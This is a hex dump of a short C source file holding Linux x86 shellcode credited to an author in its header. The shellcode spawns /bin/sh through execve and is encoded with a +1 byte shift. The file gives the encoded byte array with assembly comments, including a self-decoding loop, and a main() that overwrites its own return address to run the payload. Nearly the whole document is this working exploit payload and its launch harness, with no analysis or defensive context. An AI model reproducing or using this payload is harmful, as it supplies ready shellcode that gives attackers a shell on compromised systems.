00000000  2f 2a 0d 0a 20 2a 20 28  6c 69 6e 75 78 2f 78 38  |/*.. * (linux/x8|
00000010  36 29 20 2d 20 65 78 65  63 76 65 28 22 2f 62 69  |6) - execve("/bi|
00000020  6e 2f 73 68 22 2c 20 5b  22 2f 62 69 6e 2f 73 68  |n/sh", ["/bin/sh|
00000030  22 5d 2c 20 4e 55 4c 4c  29 20 2f 20 65 6e 63 6f  |"], NULL) / enco|
00000040  64 65 64 20 62 79 20 2b  31 20 2d 20 33 39 20 62  |ded by +1 - 39 b|
00000050  79 74 65 73 0d 0a 20 2a  20 2d 20 69 7a 69 6b 20  |ytes.. * - izik |
00000060  3c 69 7a 69 6b 40 74 74  79 36 34 2e 6f 72 67 3e  |<izik@tty64.org>|
00000070  0d 0a 20 2a 2f 0d 0a 0d  0a 63 68 61 72 20 73 68  |.. */....char sh|
00000080  65 6c 6c 63 6f 64 65 5b  5d 20 3d 20 0d 0a 0d 0a  |ellcode[] = ....|
00000090  09 22 5c 78 36 38 5c 78  38 61 5c 78 65 32 5c 78  |."\x68\x8a\xe2\x|
000000a0  63 65 5c 78 38 31 22 20  20 2f 2f 20 70 75 73 68  |ce\x81"  // push|
000000b0  20 24 30 78 38 31 63 65  65 32 38 61 20 0d 0a 09  | $0x81cee28a ...|
000000c0  22 5c 78 36 38 5c 78 62  31 5c 78 30 63 5c 78 35  |"\x68\xb1\x0c\x5|
000000d0  33 5c 78 35 34 22 20 20  2f 2f 20 70 75 73 68 20  |3\x54"  // push |
000000e0  24 30 78 35 34 35 33 30  63 62 31 20 0d 0a 09 22  |$0x54530cb1 ..."|
000000f0  5c 78 36 38 5c 78 36 61  5c 78 36 66 5c 78 38 61  |\x68\x6a\x6f\x8a|
00000100  5c 78 65 34 22 20 20 2f  2f 20 70 75 73 68 20 24  |\xe4"  // push $|
00000110  30 78 65 34 38 61 36 66  36 61 20 0d 0a 09 22 5c  |0xe48a6f6a ..."\|
00000120  78 36 38 5c 78 30 31 5c  78 36 39 5c 78 33 30 5c  |x68\x01\x69\x30\|
00000130  78 36 33 22 20 20 2f 2f  20 70 75 73 68 20 24 30  |x63"  // push $0|
00000140  78 36 33 33 30 36 39 30  31 20 0d 0a 09 22 5c 78  |x63306901 ..."\x|
00000150  36 38 5c 78 36 39 5c 78  33 30 5c 78 37 34 5c 78  |68\x69\x30\x74\x|
00000160  36 39 22 20 20 2f 2f 20  70 75 73 68 20 24 30 78  |69"  // push $0x|
00000170  36 39 37 34 33 30 36 39  20 0d 0a 09 22 5c 78 36  |69743069 ..."\x6|
00000180  61 5c 78 31 34 22 20 20  20 20 20 20 20 20 20 20  |a\x14"          |
00000190  20 20 20 20 2f 2f 20 70  75 73 68 20 24 30 78 31  |    // push $0x1|
000001a0  34 20 0d 0a 09 22 5c 78  35 39 22 20 20 20 20 20  |4 ..."\x59"     |
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000001c0  70 6f 70 20 25 65 63 78  20 0d 0a 09 0d 0a 09 2f  |pop %ecx ....../|
000001d0  2f 0d 0a 09 2f 2f 20 3c  5f 75 6e 70 61 63 6b 5f  |/...// <_unpack_|
000001e0  6c 6f 6f 70 3e 3a 0d 0a  09 2f 2f 0d 0a 0d 0a 09  |loop>:...//.....|
000001f0  22 5c 78 66 65 5c 78 30  63 5c 78 30 63 22 20 20  |"\xfe\x0c\x0c"  |
00000200  20 20 20 20 20 20 20 20  2f 2f 20 64 65 63 62 20  |        // decb |
00000210  28 25 65 73 70 2c 25 65  63 78 2c 31 29 20 0d 0a  |(%esp,%ecx,1) ..|
00000220  09 22 5c 78 34 39 22 20  20 20 20 20 20 20 20 20  |."\x49"         |
00000230  20 20 20 20 20 20 20 20  20 2f 2f 20 64 65 63 20  |         // dec |
00000240  25 65 63 78 20 0d 0a 09  22 5c 78 37 39 5c 78 66  |%ecx ..."\x79\xf|
00000250  61 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |a"              |
00000260  2f 2f 20 6a 6e 73 20 3c  5f 75 6e 70 61 63 6b 5f  |// jns <_unpack_|
00000270  6c 6f 6f 70 3e 20 0d 0a  09 22 5c 78 34 31 22 20  |loop> ..."\x41" |
00000280  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000290  20 2f 2f 20 69 6e 63 20  25 65 63 78 20 0d 0a 09  | // inc %ecx ...|
000002a0  22 5c 78 66 37 5c 78 65  31 22 20 20 20 20 20 20  |"\xf7\xe1"      |
000002b0  20 20 20 20 20 20 20 20  2f 2f 20 6d 75 6c 20 25  |        // mul %|
000002c0  65 63 78 20 0d 0a 09 22  5c 78 35 34 22 20 20 20  |ecx ..."\x54"   |
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000002e0  2f 20 70 75 73 68 20 25  65 73 70 20 0d 0a 09 22  |/ push %esp ..."|
000002f0  5c 78 63 33 22 3b 20 20  20 20 20 20 20 20 20 20  |\xc3";          |
00000300  20 20 20 20 20 20 20 2f  2f 20 72 65 74 20 0d 0a  |       // ret ..|
00000310  0d 0a 69 6e 74 20 6d 61  69 6e 28 69 6e 74 20 61  |..int main(int a|
00000320  72 67 63 2c 20 63 68 61  72 20 2a 2a 61 72 67 76  |rgc, char **argv|
00000330  29 20 7b 0d 0a 09 69 6e  74 20 2a 72 65 74 3b 0d  |) {...int *ret;.|
00000340  0a 09 72 65 74 20 3d 20  28 69 6e 74 20 2a 29 26  |..ret = (int *)&|
00000350  72 65 74 20 2b 20 32 3b  0d 0a 09 28 2a 72 65 74  |ret + 2;...(*ret|
00000360  29 20 3d 20 28 69 6e 74  29 20 73 68 65 6c 6c 63  |) = (int) shellc|
00000370  6f 64 65 3b 0d 0a 7d                              |ode;..}|
00000377
